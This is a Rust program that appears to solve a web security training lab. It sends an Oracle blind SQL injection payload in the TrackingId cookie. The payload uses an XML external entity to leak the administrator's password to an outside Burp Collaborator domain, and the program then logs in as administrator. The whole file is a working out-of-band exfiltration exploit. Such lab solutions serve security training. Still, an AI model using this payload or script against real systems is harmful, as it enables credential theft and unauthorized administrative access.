use reqwest::header::COOKIE;
use server_side_sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, generate_clap_parser, get_tracking_id, login_as_administrator,
};
use std::io::{self, Write};
use urlencoding::encode;

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let collaborator_domain = args
        .collaborator_domain
        .expect("[-] Burp Collaborator Domain is required for solving this lab");

    let tracking_id = get_tracking_id(lab_url);

    let payload = format!(
        r#"' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.{}/"> %remote;]>'),'/l') FROM dual) --"#,
        collaborator_domain
    );

    let response = HTTP_CLIENT
        .get(lab_url)
        .header(
            COOKIE,
            format!("TrackingId={}{}", tracking_id, encode(payload.as_ref())),
        )
        .send()
        .expect("[-] Failed to make the request");

    if response.status() == 200 {
        logger::success(
            "Made the request successfully. Check Burp Collaborator for the administrator password",
        );
        logger::info(
            "Once you have got the password from Burp Collaborator enter it below for logging in as administrator....",
        );

        print!("[~] Administrator Password: ");
        io::stdout().flush().unwrap();

        let mut administrator_password: String = String::new();
        io::stdin()
            .read_line(&mut administrator_password)
            .expect("[-] Failed to read input");

        login_as_administrator(lab_url, administrator_password.trim().to_string());
    } else {
        panic!("{}", logger::error_return("Failed to make the request"))
    }

    check_is_lab_solved(lab_url);
}
